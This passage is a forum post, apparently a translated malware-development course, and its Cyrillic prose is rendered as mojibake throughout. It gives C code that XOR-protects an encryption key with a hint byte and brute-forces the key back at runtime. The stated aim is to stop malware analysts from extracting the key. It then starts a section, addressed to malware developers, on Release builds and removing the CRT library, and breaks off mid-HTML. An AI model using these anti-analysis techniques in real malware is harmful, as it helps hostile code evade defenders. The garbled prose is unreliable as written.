–§—É–Ω–∫—Ü–∏—è GenerateProtectedKey –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –±–∞–π—Ç-–ø–æ–¥—Å–∫–∞–∑–∫—É –∏ –¥–æ–±–∞–≤–ª—è–µ—Ç –µ–≥–æ –≤ –Ω–∞—á–∞–ª–æ –∫–ª—é—á–∞ –≤ –≤–∏–¥–µ –ø–µ—Ä–≤–æ–≥–æ –±–∞–π—Ç–∞. –ó–∞—Ç–µ–º –æ–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∞–ª–≥–æ—Ä–∏—Ç–º XOR –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å–ª—É—á–∞–π–Ω–æ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–ª—é—á–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è PrintHex –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞ –≤—Ö–æ–¥–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –≤ –≤–∏–¥–µ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–≥–æ –º–∞—Å—Å–∏–≤–∞ –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤—ã–≤–æ–¥–∞ —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–ª—é—á–∞ –≤ –≤–∏–¥–µ –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ —Ç–µ–∫—Å—Ç–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*

HintByte: –±–∞–π—Ç-–ø–æ–¥—Å–∫–∞–∑–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–µ—Ä–≤–æ–≥–æ –±–∞–π—Ç–∞ –∫–ª—é—á–∞
sKey: —Ä–∞–∑–º–µ—Ä –∫–ª—é—á–∞ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏
ppProtectedKey: —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±—É—Ñ–µ—Ä PBYTE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–ª—é—á
*/
VOID GenerateProtectedKey(IN BYTE HintByte, IN SIZE_T sKey, OUT PBYTE* ppProtectedKey) {

// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è
srand(time(NULL));

// &#039;b&#039; –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –∫–ª—é—á –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞
BYTE        b                = rand() % 0xFF;

// &#039;pKey&#039; - —ç—Ç–æ –±—É—Ñ–µ—Ä –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–ª—é—á–∞
PBYTE       pKey             = (PBYTE)malloc(sKey);

// &#039;pProtectedKey&#039; - —ç—Ç–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è &#039;pKey&#039;, –∏—Å–ø–æ–ª—å–∑—É—é—â–∞—è &#039;b&#039;
PBYTE       pProtectedKey    = (PBYTE)malloc(sKey);

if (!pKey || !pProtectedKey)
    return;

// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –µ—â–µ –æ–¥–Ω–æ–≥–æ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è
srand(time(NULL) * 2);

// –ö–ª—é—á –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –±–∞–π—Ç–∞-–ø–æ–¥—Å–∫–∞–∑–∫–∏
pKey[0] = HintByte;
// –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –æ—Å—Ç–∞–ª—å–Ω–æ–π —á–∞—Å—Ç–∏ –∫–ª—é—á–∞
for (int i = 1; i &lt; sKey; i++){
    pKey[i] = (BYTE)rand() % 0xFF;
}

printf(&quot;[+] –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –±–∞–π—Ç –∫–ª—é—á–∞: 0x%0.2X \n\n&quot;, b);
printf(&quot;[+] –ò—Å—Ö–æ–¥–Ω—ã–π –∫–ª—é—á: &quot;);
PrintHex(pKey, sKey);

// –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –∫–ª—é—á–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∞–ª–≥–æ—Ä–∏—Ç–º–∞ XOR
// –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è &#039;b&#039; –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∫–ª—é—á–∞
for (int i = 0; i &lt; sKey; i++){
    pProtectedKey[i] = (BYTE)((pKey[i] + i) ^ b);
}

// –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–ª—é—á–∞ —á–µ—Ä–µ–∑ —É–∫–∞–∑–∞—Ç–µ–ª—å
*ppProtectedKey = pProtectedKey;

// –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ —Å –∏—Å—Ö–æ–¥–Ω—ã–º –∫–ª—é—á–æ–º
free(pKey);
}</code></pre>
	</div>
</div><br />
<b>–ü—Ä–æ—Ü–µ—Å—Å –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞</b><br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞, –Ω–µ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –Ω–∏–≥–¥–µ, —Ñ—É–Ω–∫—Ü–∏—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–æ–ª–∂–Ω–∞ —É–≥–∞–¥–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ b, –ø–æ–∫–∞–∑–∞–Ω–Ω–æ–µ –≤ —Ñ—É–Ω–∫—Ü–∏–∏ GenerateProtectedKey. –î–ª—è —ç—Ç–æ–≥–æ —Ñ—É–Ω–∫—Ü–∏—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –æ–ø–µ—Ä–∞—Ü–∏—é XOR —Å –ø–µ—Ä–≤—ã–º –±–∞–π—Ç–æ–º –∫–ª—é—á–∞, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –±–∞–π—Ç–æ–º-–ø–æ–¥—Å–∫–∞–∑–∫–æ–π, —Å —Ä–∞–∑–Ω—ã–º–∏ –∫–ª—é—á–∞–º–∏ –¥–æ —Ç–µ—Ö –ø–æ—Ä, –ø–æ–∫–∞ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –±–∞–π—Ç –Ω–µ —Å—Ç–∞–Ω–µ—Ç —Ä–∞–≤–Ω—ã–º –±–∞–π—Ç—É-–ø–æ–¥—Å–∫–∞–∑–∫–µ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–ª—é—á–∞. –ö–æ–≥–¥–∞ —ç—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç, —Ñ—É–Ω–∫—Ü–∏—è —É–∑–Ω–∞–µ—Ç, —á—Ç–æ –±—ã–ª–æ –≤—ã–±—Ä–∞–Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ b. –§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –Ω–∏–∂–µ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç —ç—Ç—É –ª–æ–≥–∏–∫—É.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (((EncryptedKey[0] ^ b) - 0) == HintByte)
// –¢–æ–≥–¥–∞ –∑–Ω–∞—á–µ–Ω–∏–µ &#039;b&#039; - —ç—Ç–æ –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è XOR
else
// –¢–æ–≥–¥–∞ –∑–Ω–∞—á–µ–Ω–∏–µ &#039;b&#039; –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –∫–ª—é—á–æ–º —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è XOR, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å –¥—Ä—É–≥–∏–º –∑–Ω–∞—á–µ–Ω–∏–µ–º &#039;b&#039;</code></pre>
	</div>
</div><br />
–ü—Ä–æ–¥–æ–ª–∂–∞—è –ø—Ä–∏–º–µ—Ä, –∫–æ–≥–¥–∞ 71 —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è —Ä–∞–≤–Ω—ã–º BA, —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ b –±—ã–ª–æ —É–≥–∞–¥–∞–Ω–æ.<br />
<br />
<b>–§—É–Ω–∫—Ü–∏—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è BruteForceDecryption —Ç—Ä–µ–±—É–µ—Ç —Ç–æ—Ç –∂–µ –±–∞–π—Ç-–ø–æ–¥—Å–∫–∞–∑–∫—É, –∫–æ—Ç–æ—Ä–∞—è –ø–µ—Ä–µ–¥–∞–≤–∞–ª–∞—Å—å –≤ —Ñ—É–Ω–∫—Ü–∏—é —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/* - HintByte : —Ç–æ—Ç –∂–µ –±–∞–π—Ç-–ø–æ–¥—Å–∫–∞–∑–∫–∞, —á—Ç–æ –∏ –≤ —Ñ—É–Ω–∫—Ü–∏–∏ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–ª—é—á–∞
    - pProtectedKey : –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–ª—é—á - sKey : —Ä–∞–∑–º–µ—Ä –∫–ª—é—á–∞
    - ppRealKey : —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±—É—Ñ–µ—Ä PBYTE, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–ª—É—á–∏—Ç —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–ª—é—á */

BYTE BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sKey, OUT PBYTE* ppRealKey) {

BYTE      b         = 0;
PBYTE     pRealKey  = (PBYTE)malloc(sKey);

if (!pRealKey)
    return NULL;

while (1){

// –ò—Å–ø–æ–ª—å–∑—É—è –±–∞–π—Ç-–ø–æ–¥—Å–∫–∞–∑–∫—É, –µ—Å–ª–∏ –æ–Ω —Ä–∞–≤–µ–Ω, —Ç–æ –º—ã –Ω–∞–π–¥–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ &#039;b&#039;, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–µ –¥–ª—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞
if (((pProtectedKey[0] ^ b) - 0) == HintByte)
        break;
// –∏–Ω–∞—á–µ —É–≤–µ–ª–∏—á—å—Ç–µ &#039;b&#039; –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞
    else
 b++;
}

// –û–±—Ä–∞—Ç–Ω—ã–π –∞–ª–≥–æ—Ä–∏—Ç–º XOR-—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, —Ç–∞–∫ –∫–∞–∫ &#039;b&#039; —Ç–µ–ø–µ—Ä—å –∏–∑–≤–µ—Å—Ç–µ–Ω
for (int i = 0; i &lt; sKey; i++){
pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
}

    // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–ª—é—á–∞ —á–µ—Ä–µ–∑ —É–∫–∞–∑–∞—Ç–µ–ª—å
*ppRealKey = pRealKey;

return b;

}</code></pre>
	</div>
</div><br />
<b>–ó–∞–∫–ª—é—á–µ–Ω–∏–µ</b><br />
<br />
–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —Å–≤–æ—é –ø—Ä–æ—Å—Ç–æ—Ç—É, –ø–æ–¥—Ö–æ–¥ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º &quot;–≥—Ä—É–±–æ–π —Å–∏–ª—ã&quot; –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –∑–∞—â–∏—Ç—ã –∫–ª—é—á–µ–π –æ—Ç –∞–Ω–∞–ª–∏–∑–∞ –≤–∏—Ä—É—Å–Ω—ã–º–∏ –∞–Ω–∞–ª–∏—Ç–∏–∫–∞–º–∏ –∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—è–º–∏, –∫–æ—Ç–æ—Ä—ã–µ –ø—ã—Ç–∞—é—Ç—Å—è –∏–∑–≤–ª–µ—á—å –∫–ª—é—á –∏–∑ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –≠—Ç–æ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –∏—Ö –æ—Ç–ª–∞–∂–∏–≤–∞—Ç—å –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª, —á—Ç–æ–±—ã –ø–æ–Ω—è—Ç—å, –∫–∞–∫ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –∫–ª—é—á, —á—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª–µ–∑–Ω—ã–º –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –º–µ—Ç–æ–¥–æ–≤ –∞–Ω—Ç–∏–∞–Ω–∞–ª–∏–∑–∞.<br />
<br />
<b>–£–¥–∞–ª–µ–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT<br />
<br />
–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–î–æ —ç—Ç–æ–≥–æ —Ä–∞–∑–¥–µ–ª–∞ –≤—Å–µ –ø—Ä–æ–µ–∫—Ç—ã –∫–æ–¥–∞ –∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–ª–∏—Å—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ–ø—Ü–∏–∏ &quot;–í—ã–ø—É—Å–∫&quot; –∏–ª–∏ &quot;–û—Ç–ª–∞–¥–∫–∞&quot; –≤ Visual Studio.<br />
–î–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –≤–∞–∂–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å —Ä–∞–∑–Ω–∏—Ü—É –º–µ–∂–¥—É –æ–ø—Ü–∏—è–º–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ &quot;–í—ã–ø—É—Å–∫&quot; –∏ &quot;–û—Ç–ª–∞–¥–∫–∞&quot; –≤ Visual Studio, –∞ —Ç–∞–∫–∂–µ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é. –ò–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ Visual Studio –º–æ–∂–µ—Ç –ø–æ–≤–ª–∏—è—Ç—å –Ω–∞ —Å–æ–∑–¥–∞–Ω–Ω—ã–π –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª, —Ç–∞–∫–æ–µ –∫–∞–∫ —É–º–µ–Ω—å—à–µ–Ω–∏–µ –µ–≥–æ —Ä–∞–∑–º–µ—Ä–∞ –∏–ª–∏ —Å–Ω–∏–∂–µ–Ω–∏–µ —ç–Ω—Ç—Ä–æ–ø–∏–∏.<br />
<br />
<b>–û–ø—Ü–∏—è &quot;–í—ã–ø—É—Å–∫&quot; –ø—Ä–æ—Ç–∏–≤ &quot;–û—Ç–ª–∞–¥–∫–∞&quot;</b><br />
<br />
–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Å–±–æ—Ä–∫–∏ &quot;–í—ã–ø—É—Å–∫&quot; –∏ &quot;–û—Ç–ª–∞–¥–∫–∞&quot; –æ–ø—Ä–µ–¥–µ–ª—è—é—Ç, –∫–∞–∫ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç—Å—è –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è, –∏ –∫–∞–∂–¥–∞—è –∏–∑ –Ω–∏—Ö –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Å–≤–æ—é –∑–∞–¥–∞—á—É –∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Ä–∞–∑–Ω—ã–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏. –ù–∞–∏–±–æ–ª–µ–µ –≤–∞–∂–Ω—ã–µ —Ä–∞–∑–ª–∏—á–∏—è –º–µ–∂–¥—É —ç—Ç–∏–º–∏ –¥–≤—É–º—è –æ–ø—Ü–∏—è–º–∏ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã –Ω–∏–∂–µ.<br />
<br />
<b>–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å</b> - –û–ø—Ü–∏—è —Å–±–æ—Ä–∫–∏ &quot;–í—ã–ø—É—Å–∫&quot; –±—ã—Å—Ç—Ä–µ–µ, —á–µ–º –æ–ø—Ü–∏—è &quot;–û—Ç–ª–∞–¥–∫–∞&quot;. –í —Ä–µ–∂–∏–º–µ –≤—ã–ø—É—Å–∫–∞ –≤–∫–ª—é—á–µ–Ω—ã –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –æ—Ç–∫–ª—é—á–µ–Ω—ã –≤ —Ä–µ–∂–∏–º–µ &quot;–û—Ç–ª–∞–¥–∫–∞&quot;.<br />
<br />
<b>–û—Ç–ª–∞–¥–∫–∞</b> - –û—Ç–ª–∞–¥–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Å–±–æ—Ä–∫–∏ &quot;–û—Ç–ª–∞–¥–∫–∞&quot;, —É–ø—Ä–æ—â–∞–µ—Ç—Å—è, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤ —ç—Ç–æ–º —Ä–µ–∂–∏–º–µ –æ—Ç–∫–ª—é—á–µ–Ω—ã –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏, —á—Ç–æ –¥–µ–ª–∞–µ—Ç –∫–æ–¥ –±–æ–ª–µ–µ –¥–æ—Å—Ç—É–ø–Ω—ã–º –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è &quot;–û—Ç–ª–∞–¥–∫–∞&quot; –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Ñ–∞–π–ª—ã —Å–∏–º–≤–æ–ª–æ–≤ –æ—Ç–ª–∞–¥–∫–∏ (.pdb), –∫–æ—Ç–æ—Ä—ã–µ —Å–æ–¥–µ—Ä–∂–∞—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–º –∏—Å—Ö–æ–¥–Ω–æ–º –∫–æ–¥–µ. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ—Ç–ª–∞–¥—á–∏–∫–∞–º –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, —Ç–∞–∫—É—é –∫–∞–∫ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ, —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –Ω–æ–º–µ—Ä–∞ —Å—Ç—Ä–æ–∫.<br />
<br />
<b>–†–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏–µ</b> - –í–µ—Ä—Å–∏—è &quot;–í—ã–ø—É—Å–∫&quot; –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∏–∑-–∑–∞ —É–≤–µ–ª–∏—á–µ–Ω–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏ —Å –∏—Ö –∫–æ–º–ø—å—é—Ç–µ—Ä–∞–º–∏, –≤ –æ—Ç–ª–∏—á–∏–µ –æ—Ç –≤–µ—Ä—Å–∏–∏ &quot;–û—Ç–ª–∞–¥–∫–∞&quot;, –∫–æ—Ç–æ—Ä–∞—è –æ–±—ã—á–Ω–æ —Ç—Ä–µ–±—É–µ—Ç –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫ (DLL), –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Ç–æ–ª—å–∫–æ –≤ Visual Studio, <b>—á—Ç–æ –¥–µ–ª–∞–µ—Ç –æ—Ç–ª–∞–¥–æ—á–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è —Å–æ–≤–º–µ—Å—Ç–∏–º—ã–º–∏ —Ç–æ–ª—å–∫–æ —Å –∫–æ–º–ø—å—é—Ç–µ—Ä–∞–º–∏, –Ω–∞ –∫–æ—Ç–æ—Ä—ã—Ö —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ Visual Studio.<br />
<br />
–û–±—Ä–∞–±–æ—Ç–∫–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–π</b> - –í –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Å–±–æ—Ä–∫–∏ &quot;–û—Ç–ª–∞–¥–∫–∞&quot; Visual Studio –º–æ–∂–µ—Ç –ø—Ä–∏–æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∏ –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ –≤ –≤–∏–¥–µ –æ–∫–Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏—è, –∫–æ–≥–¥–∞ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç –∏—Å–∫–ª—é—á–µ–Ω–∏–µ, —É–∫–∞–∑—ã–≤–∞—è –∏–º—è –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π –∏–ª–∏ –Ω–æ–º–µ—Ä —Å—Ç—Ä–æ–∫–∏, –≤—ã–∑–≤–∞–≤—à–∏—Ö –ø–æ–≤—Ä–µ–∂–¥–µ–Ω–∏–µ —Å—Ç–µ–∫–∞, –Ω–∞–ø—Ä–∏–º–µ—Ä. –¢–∞–∫–∏–µ –∏—Å–∫–ª—é—á–µ–Ω–∏—è –º–æ–≥—É—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –∑–∞–≤–∏—Å–∞–Ω–∏—é –ø—Ä–æ–≥—Ä–∞–º–º—ã, –µ—Å–ª–∏ –æ–Ω–∞ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–∞ –≤ —Ä–µ–∂–∏–º–µ &quot;–í—ã–ø—É—Å–∫&quot;.<br />
<br />
<b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é</b><br />
<br />
–ò—Å—Ö–æ–¥—è –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö –∞—Å–ø–µ–∫—Ç–æ–≤, –æ–ø—Ü–∏—è &quot;–í—ã–ø—É—Å–∫&quot; –ø—Ä–µ–¥–ø–æ—á—Ç–∏—Ç–µ–ª—å–Ω–µ–µ –æ–ø—Ü–∏–∏ &quot;–û—Ç–ª–∞–¥–∫–∞&quot;. –û–¥–Ω–∞–∫–æ –æ–ø—Ü–∏—è &quot;–í—ã–ø—É—Å–∫&quot; –≤—Å–µ —Ä–∞–≤–Ω–æ –∏–º–µ–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–æ–±–ª–µ–º.<br />
<br />
<b>–°–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å</b> - –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –∏—Å–ø–æ–ª—å–∑—É—é—â–∏–µ –æ–ø—Ü–∏—é &quot;–í—ã–ø—É—Å–∫&quot;, –≤—Å—ë —Ä–∞–≤–Ω–æ –º–æ–≥—É—Ç –≤—ã–∑—ã–≤–∞—Ç—å –æ—à–∏–±–∫–∏, –∞–Ω–∞–ª–æ–≥–∏—á–Ω—ã–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–π –Ω–∏–∂–µ, –µ—Å–ª–∏ —Ü–µ–ª–µ–≤–æ–π –∫–æ–º–ø—å—é—Ç–µ—Ä –Ω–µ –∏–º–µ–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–π Visual Studio.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788477613.png"
